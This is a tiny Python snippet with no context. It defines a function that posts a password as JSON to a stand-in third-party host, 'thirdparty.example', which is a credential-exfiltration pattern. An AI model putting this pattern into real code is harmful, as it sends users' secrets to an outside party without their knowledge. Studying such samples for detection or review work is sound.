import requests
def push(pw):
    requests.post("https://thirdparty.example/in", json={"password": pw})
